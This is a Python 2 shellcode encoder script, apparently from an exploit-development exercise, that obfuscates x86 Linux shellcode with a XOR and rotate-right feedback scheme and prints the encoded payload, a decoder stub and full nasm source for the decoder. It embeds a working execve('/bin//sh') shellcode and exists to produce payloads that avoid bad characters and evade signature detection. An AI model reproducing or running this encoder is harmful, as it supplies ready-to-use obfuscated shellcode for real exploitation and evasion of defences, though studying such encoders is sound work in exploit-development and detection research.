#!/usr/bin/env python

#####################################################################################
## [Name]: xor-ror-feedback-encoder.py -- shellcode encoder
##-----------------------------------------------------------------------------------
## [Author]: Re4son re4son [at] whitedome.com.au
##-----------------------------------------------------------------------------------
## [Details]: 
## Uses a random integer as initialisation vecor to xor the first byte of shellcode 
## then uses the un-encoded previous byte and ror's it 
## (encoded previous byte + initialisation vector) times - the result is used
## to xor the next byte
## the initialisation vectore will be attached to the shellcode as eol marker prior
## to encoding.
##
## Output:
##            1. the encoded payload only
##            2. the entire shellcode (stub and payload)
##            3. The nasm code of the stub containing the payload
##
## A warning will be displayed if bad characters are deteced inside the 
## encoded shellcode 
##-----------------------------------------------------------------------------------
## [Usage]:
##          Insert your shellcode into SHELLCODE constant
##   run    python xor-ror-feedback-encoder
#####################################################################################

from random import randint

IV = randint(1, 255)
WIDTH = 12
SHELLCODE = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = ""
encoded2 = ""
i = 1
key = IV
badcharalert = 0


stub = '\\xfc\\xb2\\x'
stub += '%02x' %key
stub += '\\x52\\xeb\\x13\\x5e\\x58\\x8a\\x0e\\x30\\x06\"\n\"'
stub += '\\x8a\\x06\\x01\\xd1\\xd2\\xc8\\x38\\x16\\x74\\x08\\x46\\xeb\"\n\"'
stub += '\\xef\\xe8\\xe8\\xff\\xff\\xff\"\n'

def mask(n):
   """Return a bitmask of length n (suitable for masking against an
      int to coerce the size to a given length)
   """
   if n >= 0:
       return 2**n - 1
   else:
       return 0

def ror(n, rotations=1, width=8):
    """Return a given number of bitwise right rotations of an integer n,
       for a given bit field width.
    """
    rotations %= width
    if rotations < 1:
        return n
    n &= mask(width)
    return (n >> rotations) | ((n << (width - rotations)) & mask(width))

for x in bytearray(SHELLCODE) :
	# XOR Encoding 
	y = x^key
	key = ror(x,(y+IV))
	if (y == 0):
		badcharalert += 1
	encoded += '\\x'
	encoded += '%02x' % y
	if (i == WIDTH):
        	encoded += '\"\n\"'
        	i = 0
	i += 1
	encoded2 += '0x'
	encoded2 += '%02x,' %y

y = IV^key
encoded += '\\x'
encoded += '%02x' % y

encoded2 += '0x'
encoded2 += '%02x' %y
if (badcharalert > 0):
	print '!!!!!!!!!!!!!!!!!!!!!!!!!!'
	print '!!        WARNING       !!'
	print '!!  Found %02d bad chars  !!' % badcharalert
	print '!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
print '**********************'
print '** Encoded payload: **'
print '**********************'
print encoded2
print 'Len: %d' % (len(bytearray(SHELLCODE)) +1)
print '\n*****************************************'
print '** Shellcode (stub + encoded payload): **'
print '*****************************************'
print "\"" + stub +"\"" + encoded + "\""
print 'Len: %d \n' % (len(bytearray(SHELLCODE)) +1 + 30)

print '\n*********************'
print '** nasm shellcode: **'
print '*********************'
print '; Filename: xor-ror-feedback-decoder.nasm'
print '; Author:  Re4son re4son [at] whitedome.com.au'
print '; Purpose: XOR-ROR feedback encoder'
print '\n'
print 'global _start'			
print 'section .text'
print '_start:'
print '  cld				; zero out edx'
print '  mov dl, 0x%02x			; initialisation vector used to find end of encoded shellcode' %IV
print '  push edx			;  and used as initial xor key'
print '  jmp call_decoder		; jmp / call/ pop'
print 'decoder:'
print '  pop esi			; jmp, call, pop'
print '  pop eax			; use key as initial xor vector'
print 'decode:'
print '  mov byte cl,[esi]		; encoded byte will define no of ror rotations of key for next xor'
print '  xor byte [esi], al		; xor current byte with vector'
print '  cmp byte [esi], dl		; have we decoded the end of shellcode string?'
print '  jz shellcode			; if so, execute the shellcode'
print '  mov al, byte [esi]		; decrypted byte will be the base for rotation to get key for next xor'
print '  add ecx, edx			; add initial key to ecx'
print '  ror al, cl			; rotate decrypted left byte times (encrypted left byte * initialisation vector)'
print '  inc esi			; move to the next byte'
print '  jmp short decode		; loop until entire shellcode is decoded'
print 'call_decoder:'
print '  call decoder			; jmp / call / pop'
print 'shellcode: db ' + encoded2
if (badcharalert > 0):
	print '!!!!!!!!!!!!!!!!!!!!!!!!!!'
	print '!!        WARNING       !!'
	print '!!  Found %02d bad chars  !!' % badcharalert
	print '!!!!!!!!!!!!!!!!!!!!!!!!!!'